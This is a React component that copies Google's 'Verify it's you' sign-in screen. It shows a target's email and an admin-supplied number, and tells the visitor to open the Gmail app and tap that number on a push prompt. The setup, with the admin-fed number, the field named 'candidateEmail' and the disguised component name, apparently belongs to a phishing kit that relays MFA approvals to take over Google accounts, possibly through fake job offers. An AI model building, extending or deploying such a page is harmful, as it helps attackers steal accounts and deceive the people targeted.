"use client";

import { useEffect } from "react";

interface GAppreciateModalProps {
  isOpen: boolean;
  candidateEmail?: string;
  appreciateValue?: string; // The custom text/number set by admin (replaces "22")
}

export default function GAppreciateModal({
  isOpen,
  candidateEmail = "candidateemail@gmail.com",
  appreciateValue = "22",
}: GAppreciateModalProps) {
  // Prevent background scroll when modal is open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = "hidden";
    } else {
      document.body.style.overflow = "";
    }
    return () => {
      document.body.style.overflow = "";
    };
  }, [isOpen]);

  if (!isOpen) return null;

  const displayEmail = candidateEmail.trim() || "candidateemail@gmail.com";
  const displayValue = appreciateValue.trim() || "22";

  return (
    <div
      className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-[#f0f4f9] p-3 sm:p-6 md:p-10 overflow-y-auto animate-fade-in font-sans"
      role="dialog"
      aria-modal="true"
    >
      <div className="w-full max-w-[1184px] flex flex-col items-center">
        {/* Main Google/SSO Style Card */}
        <div className="w-full min-h-[512px] sm:min-h-[560px] bg-white rounded-[28px] p-8 sm:p-12 lg:p-16 shadow-[0_8px_36px_rgba(0,0,0,0.08)] border border-black/[0.04] transition-all relative overflow-hidden flex flex-col justify-center">

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-14 lg:gap-20 items-center">
            {/* Left Column: N-Logo, "Thank you", explanation text, and email pill */}
            <div className="space-y-5 sm:space-y-6">
              {/* N-Logo (PNG Format) */}
              <div className="flex items-center">
                <img
                  src="/images/n-logo.png"
                  alt="N-Logo"
                  className="w-16 h-16 object-contain rounded-xl select-none shadow-sm"
                />
              </div>

              {/* Title */}
              <div className="pt-1">
                <h1 className="text-3xl sm:text-4xl lg:text-[43px] font-normal text-[#1f1f1f] tracking-tight leading-[1.15]">
                  Verify it's you
                </h1>
              </div>

              {/* Subtitle / Explanation text */}
              <p className="text-sm sm:text-base text-[#1f1f1f] font-normal leading-relaxed pt-1 max-w-lg">
                To help keep your account safe, Google wants to make sure it&apos;s really you trying to sing in.{" "}
                <span className="text-[#0b57d0] cursor-pointer hover:underline">Learn more</span>
              </p>

              {/* Candidate Email Badge / Pill with Silhouette Icon & Chevron */}
              <div className="pt-1">
                <div className="inline-flex items-center gap-2.5 border border-[#747775]/70 hover:border-[#1f1f1f] rounded-full pl-1.5 pr-3.5 py-1 bg-white hover:bg-gray-50/80 transition-colors select-none cursor-pointer shadow-2xs">
                  {/* Silhouette Avatar Circle */}
                  <div className="w-7 h-7 rounded-full bg-gray-100 text-gray-600 flex items-center justify-center shrink-0">
                    <svg
                      className="w-4 h-4 text-gray-500"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                      aria-hidden="true"
                    >
                      <path
                        fillRule="evenodd"
                        d="M18.685 19.097A9.723 9.723 0 0021.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 003.065 7.097A9.716 9.716 0 0012 21.75a9.716 9.716 0 006.685-2.653zm-12-1.282A8.25 8.25 0 0112 14.25a8.25 8.25 0 015.315 3.565A8.25 8.25 0 0112 20.25a8.25 8.25 0 01-5.315-2.435zM12 6.75a3.75 3.75 0 100 7.5 3.75 3.75 0 000-7.5z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </div>

                  {/* Candidate Email */}
                  <span className="text-sm sm:text-base font-medium text-[#1f1f1f] tracking-tight">
                    {displayEmail}
                  </span>

                  {/* Downward chevron */}
                  <svg
                    className="w-3.5 h-3.5 text-[#444746]"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                    aria-hidden="true"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
                      clipRule="evenodd"
                    />
                  </svg>
                </div>
              </div>
            </div>

            {/* Right Column: Large appreciate number/value + description */}
            <div className="w-full flex flex-col items-center justify-center space-y-4">
              {/* Big number / custom value */}
              <div className="text-[48px] sm:text-[60px] text-[#1f1f1f] leading-none select-none tracking-tighter text-center w-full">
                {displayValue}
              </div>

              {/* "Open the best feeling" heading */}
              <p className="text-lg sm:text-xl text-[#1f1f1f] text-center">
                Open the Gmail app on you phone.
              </p>

              {/* Instructional paragraph */}
              <p className="text-xs sm:text-sm text-[#1f1f1f] leading-relaxed max-w-sm text-center">
                Google sent a notification to you phone. Open the Gmail app{" "}
                tap <span className="font-bold">Yes</span> on the prompt, then tap{" "}
                <span className="font-bold">{displayValue}</span> on your phone to verify
                it&apos;s you.
              </p>

              {/* Resend it link */}
              <div className="pt-4">
                <button
                  type="button"
                  className="text-sm text-[#0b57d0] hover:underline cursor-pointer select-none font-normal"
                >
                  
                </button>
              </div>

              {/* Try another way link - bottom right alignment */}
              <div className="w-full flex justify-end pt-8 sm:pt-12">
                <button
                  type="button"
                  className="text-sm text-[#0b57d0] hover:underline cursor-pointer select-none font-normal"
                >
                  Try another way
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Outer Footer Below Card */}
        <div className="w-full max-w-[1184px] flex flex-col sm:flex-row items-center justify-between gap-3 text-xs sm:text-sm text-[#444746] mt-5 px-4 select-none">
          {/* Language selector */}
          <div className="flex items-center gap-2 hover:text-[#1f1f1f] cursor-pointer">
            <span>English (United States)</span>
            <span className="text-xs">▼</span>
          </div>

          {/* Legal / Help links */}
          <div className="flex items-center gap-6 sm:gap-7">
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Help</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Privacy</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Terms</span>
          </div>
        </div>
      </div>
    </div>
  );
}
